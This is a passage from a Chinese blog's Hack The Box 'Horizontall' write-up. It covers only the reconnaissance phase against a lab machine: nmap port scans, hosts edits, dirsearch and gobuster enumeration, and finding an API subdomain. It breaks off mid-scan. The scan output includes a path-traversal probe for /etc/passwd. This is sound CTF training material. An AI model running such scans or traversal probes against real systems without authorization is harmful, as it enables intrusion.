

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：js敏感信息泄露、CVE-2019-19609漏洞利用、CVE-2021-3129漏洞利用、SSH端口转发、SSH公钥写入靶机登录">
<meta property="og:type" content="article">
<meta property="og:title" content="Horizontall-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2023/12/26/Horizontall-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：js敏感信息泄露、CVE-2019-19609漏洞利用、CVE-2021-3129漏洞利用、SSH端口转发、SSH公钥写入靶机登录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/5.png">
<meta property="og:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/6.png">
<meta property="og:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/7.png">
<meta property="og:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/8.jpg">
<meta property="article:published_time" content="2023-12-26T15:50:55.000Z">
<meta property="article:modified_time" content="2023-12-31T14:54:58.786Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/Horizontall-htb-writeup/1.png">
  
  
  
  <title>Horizontall-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/P2note/" target="_self">
                    
                    <span>综合安全工具集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Horizontall-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-12-26 23:50" pubdate>
          2023年12月26日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          40k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          330 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Horizontall-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：js敏感信息泄露、CVE-2019-19609漏洞利用、CVE-2021-3129漏洞利用、SSH端口转发、SSH公钥写入靶机登录</p>
<span id="more"></span>  

<p>参考链接：<code>https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html</code></p>
<p>参考链接：<code>https://systemweakness.com/wriet-hack-the-box-horizontall-2c4503a87a49</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.105</p>
<p>2、测试下靶机连通率</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ping 10.10.11.105 -c 4<br>PING 10.10.11.105 (10.10.11.105) 56(84) bytes of data.<br>64 bytes from 10.10.11.105: icmp_seq=1 ttl=63 time=540 ms<br>64 bytes from 10.10.11.105: icmp_seq=2 ttl=63 time=299 ms<br>64 bytes from 10.10.11.105: icmp_seq=3 ttl=63 time=295 ms<br>64 bytes from 10.10.11.105: icmp_seq=4 ttl=63 time=295 ms<br><br>--- 10.10.11.105 ping statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3006ms<br>rtt min/avg/max/mdev = 294.912/357.273/540.497/105.794 ms<br></code></pre></td></tr></table></figure>

<p>3、测试下开放端口情况</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -p- --min-rate=10000 -oG allports 10.10.11.105    <br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-26 21:37 CST<br>Warning: 10.10.11.105 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.105<br>Host is up (0.36s latency).<br>Not shown: 59671 closed tcp ports (reset), 5862 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 55.57 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br>22,80,                                                                                         <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sV -sC -p22,80 -Pn --min-rate=10000 10.10.11.105<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-26 21:40 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.105<br>Host is up (0.30s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:<span class="hljs-built_in">cd</span>:ff:6b:0d:d5 (RSA)<br>|   256 3a:d5:89:d5:da:95:59:d9:<span class="hljs-built_in">df</span>:01:68:37:ca:d5:10:b0 (ECDSA)<br>|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)<br>80/tcp open  http    nginx 1.14.0 (Ubuntu)<br>|_http-server-header: nginx/1.14.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://horizontall.htb<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.87 seconds<br></code></pre></td></tr></table></figure>

<p>4、这里发现了一个域名信息，本机做一下靶机hosts绑定</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;10.10.11.105 horizontall.htb&#x27;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>10.10.11.105 horizontall.htb<br></code></pre></td></tr></table></figure>

<p>5、因为也是开放的80和22，那就继续目录扫描下，看看有什么信息泄露吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ dirsearch -u http://horizontall.htb/<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25<br>Wordlist size: 11460<br><br>Output File: /home/kali/桌面/reports/http_horizontall.htb/__23-12-26_21-47-44.txt<br><br>Target: http://horizontall.htb/<br><br>[21:47:44] Starting: <br>[21:47:48] 301 -  194B  - /js  -&gt;  http://horizontall.htb/js/               <br>[21:48:54] 301 -  194B  - /css  -&gt;  http://horizontall.htb/css/             <br>[21:49:04] 200 -    4KB - /favicon.ico                                      <br>[21:49:12] 301 -  194B  - /img  -&gt;  http://horizontall.htb/img/             <br>[21:49:17] 403 -  580B  - /js/ <br><br>Task Completed<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ gobuster <span class="hljs-built_in">dir</span> -u http://horizontall.htb/ --wordlist=/usr/share/dirb/wordlists/common.txt <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://horizontall.htb/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirb/wordlists/common.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/css                  (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/css/]<br>/favicon.ico          (Status: 200) [Size: 4286]<br>/img                  (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/img/]<br>/index.html           (Status: 200) [Size: 901]<br>/js                   (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/js/]<br>Progress: 4614 / 4615 (99.98%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>

<p>6、这里通过一系列的漏洞枚举，目录探测，各种都没有发现入口点，峰回路转，在 app.c68eb462.js 里发现了一个新的域名信息</p>
<p><img src="http://sh1yan.top/photo/Horizontall-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://horizontall.htb/js/app.c68eb462.js<br><br>					getReviews: <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>						var t = this;<br>						r.a.get(<br>								<span class="hljs-string">&quot;http://api-prod.horizontall.htb/reviews&quot;</span><br>							)<br>							.<span class="hljs-keyword">then</span>((function(s) &#123;<br>								return t.reviews = s.data<br>							&#125;))<br>					&#125;<br></code></pre></td></tr></table></figure>

<p>7、本机做下hosts靶机绑定</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;10.10.11.105 api-prod.horizontall.htb&#x27;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>[sudo] kali 的密码：<br>10.10.11.105 api-prod.horizontall.htb<br></code></pre></td></tr></table></figure>

<p>8、访问 &#x2F;reviews 路径下信息</p>
<p><code>http://api-prod.horizontall.htb/reviews</code></p>
<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">[&#123;<span class="hljs-comment">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-comment">&quot;name&quot;</span>:<span class="hljs-comment">&quot;wail&quot;</span>,<span class="hljs-comment">&quot;description&quot;</span>:<span class="hljs-comment">&quot;This is good service&quot;</span>,<span class="hljs-comment">&quot;stars&quot;</span>:<span class="hljs-number">4</span>,<span class="hljs-comment">&quot;created_at&quot;</span>:<span class="hljs-comment">&quot;2021-05-29T13:23:38.000Z&quot;</span>,<span class="hljs-comment">&quot;updated_at&quot;</span>:<span class="hljs-comment">&quot;2021-05-29T13:23:38.000Z&quot;</span>&#125;,&#123;<span class="hljs-comment">&quot;id&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-comment">&quot;name&quot;</span>:<span class="hljs-comment">&quot;doe&quot;</span>,<span class="hljs-comment">&quot;description&quot;</span>:<span class="hljs-comment">&quot;i&#x27;m satisfied with the product&quot;</span>,<span class="hljs-comment">&quot;stars&quot;</span>:<span class="hljs-number">5</span>,<span class="hljs-comment">&quot;created_at&quot;</span>:<span class="hljs-comment">&quot;2021-05-29T13:24:17.000Z&quot;</span>,<span class="hljs-comment">&quot;updated_at&quot;</span>:<span class="hljs-comment">&quot;2021-05-29T13:24:17.000Z&quot;</span>&#125;,&#123;<span class="hljs-comment">&quot;id&quot;</span>:<span class="hljs-number">3</span>,<span class="hljs-comment">&quot;name&quot;</span>:<span class="hljs-comment">&quot;john&quot;</span>,<span class="hljs-comment">&quot;description&quot;</span>:<span class="hljs-comment">&quot;create service with minimum price i hop i can buy more in the futur&quot;</span>,<span class="hljs-comment">&quot;stars&quot;</span>:<span class="hljs-number">5</span>,<span class="hljs-comment">&quot;created_at&quot;</span>:<span class="hljs-comment">&quot;2021-05-29T13:25:26.000Z&quot;</span>,<span class="hljs-comment">&quot;updated_at&quot;</span>:<span class="hljs-comment">&quot;2021-05-29T13:25:26.000Z&quot;</span>&#125;]<br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Horizontall-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<p>9、并没有什么有用的信息，继续查看下网站的首页目录</p>
<p><img src="http://sh1yan.top/photo/Horizontall-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<p>10、首页是空白，那就继续目录扫描下看看吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ dirsearch -u http://api-prod.horizontall.htb/<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25<br>Wordlist size: 11460<br><br>Output File: /home/kali/桌面/reports/http_api-prod.horizontall.htb/__23-12-26_22-15-26.txt<br><br>Target: http://api-prod.horizontall.htb/<br><br>[22:15:26] Starting: <br>[22:15:54] 400 -   67B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           <br>[22:16:05] 200 -  854B  - /ADMIN                                            <br>[22:16:05] 200 -  854B  - /admin<br>[22:16:05] 200 -  854B  - /Admin<br>[22:16:06] 200 -  854B  - /admin/                                           <br>[22:16:06] 200 -  854B  - /Admin/<br>[22:16:06] 200 -  854B  - /admin/%3bindex/<br>[22:16:06] 200 -  854B  - /admin/.config<br>[22:16:06] 200 -  854B  - /admin/_logs/access-log<br>[22:16:06] 200 -  854B  - /admin/.htaccess<br>[22:16:06] 200 -  854B  - /admin/_logs/access_log<br>[22:16:06] 200 -  854B  - /admin/_logs/error_log<br>[22:16:06] 200 -  854B  - /admin/access_log<br>[22:16:06] 200 -  854B  - /admin/_logs/error-log<br>[22:16:06] 200 -  854B  - /admin/account                                    <br>[22:16:06] 200 -  854B  - /admin/admin                                      <br>[22:16:06] 200 -  854B  - /admin/admin-login<br>[22:16:07] 200 -  854B  - /admin/admin/login                                <br>[22:16:07] 200 -  854B  - /admin/admin_login<br>[22:16:07] 200 -  854B  - /admin/adminLogin                                 <br>[22:16:07] 200 -  854B  - /admin/controlpanel                               <br>[22:16:07] 200 -  854B  - /admin/backup/<br>[22:16:07] 200 -  854B  - /admin/backups/                                   <br>[22:16:07] 200 -  854B  - /admin/cp                                         <br>[22:16:07] 200 -  854B  - /admin/data/autosuggest                           <br>[22:16:07] 200 -  854B  - /admin/dumper/<br>[22:16:07] 200 -  854B  - /admin/error_log                                  <br>[22:16:07] 200 -  854B  - /admin/FCKeditor<br>[22:16:07] 200 -  854B  - /admin/heapdump                                   <br>[22:16:07] 200 -  854B  - /admin/db/                                        <br>[22:16:08] 200 -  854B  - /admin/default                                    <br>[22:16:08] 200 -  854B  - /admin/home<br>[22:16:08] 200 -  854B  - /admin/js/tiny_mce                                <br>[22:16:08] 200 -  854B  - /admin/index.html<br>[22:16:08] 200 -  854B  - /admin/index                                      <br>[22:16:08] 200 -  854B  - /admin/js/tiny_mce/                               <br>[22:16:08] 200 -  854B  - /admin/js/tinymce/                                <br>[22:16:08] 200 -  854B  - /admin/js/tinymce                                 <br>[22:16:08] 200 -  854B  - /admin/log<br>[22:16:08] 200 -  854B  - /admin/login                                      <br>[22:16:08] 200 -  854B  - /admin/logs/access-log<br>[22:16:08] 200 -  854B  - /Admin/login/<br>[22:16:08] 200 -  854B  - /admin/logs/<br>[22:16:08] 200 -  854B  - /admin/logs/access_log                            <br>[22:16:08] 200 -  854B  - /admin/logs/error-log                             <br>[22:16:09] 200 -  854B  - /admin/manage                                     <br>[22:16:09] 200 -  854B  - /admin/mysql/                                     <br>[22:16:09] 200 -  854B  - /admin/phpMyAdmin<br>[22:16:09] 200 -  854B  - /admin/phpmyadmin/                                <br>[22:16:09] 200 -  854B  - /admin/pMA/<br>[22:16:09] 200 -  854B  - /admin/pma/<br>[22:16:09] 200 -  854B  - /admin/private/logs<br>[22:16:09] 200 -  854B  - /admin/portalcollect.php?f=http://xxx&amp;t=js        <br>[22:16:09] 200 -  854B  - /admin/logs/error_log                             <br>[22:16:09] 200 -  854B  - /admin/release<br>[22:16:09] 200 -  854B  - /admin/scripts/fckeditor<br>[22:16:09] 200 -  854B  - /admin/signin<br>[22:16:09] 200 -  854B  - /admin/sqladmin/                                  <br>[22:16:09] 200 -  854B  - /admin/sxd/                                       <br>[22:16:09] 200 -  854B  - /admin/sysadmin/<br>[22:16:09] 200 -  854B  - /admin/phpMyAdmin/<br>[22:16:09] 200 -  854B  - /admin/tiny_mce<br>[22:16:09] 200 -  854B  - /admin/tinymce<br>[22:16:09] 200 -  854B  - /admin/web/                                       <br>[22:16:09] 200 -  854B  - /admin/views/ajax/autocomplete/user/a             <br>[22:16:57] 200 -    1KB - /favicon.ico                                      <br>[22:17:49] 200 -  507B  - /reviews                                          <br>[22:17:49] 200 -  121B  - /robots.txt                                       <br>[22:18:16] 403 -   60B  - /users                                            <br>[22:18:17] 403 -   60B  - /users/admin                                      <br>[22:18:17] 403 -   60B  - /users/login.jsp<br>[22:18:17] 403 -   60B  - /users/login.html<br>[22:18:17] 403 -   60B  - /users/login<br>[22:18:17] 403 -   60B  - /users/login.php<br>[22:18:17] 403 -   60B  - /users/login.aspx<br>[22:18:17] 403 -   60B  - /users/admin.php                                  <br>[22:18:17] 403 -   60B  - /users/login.js                                   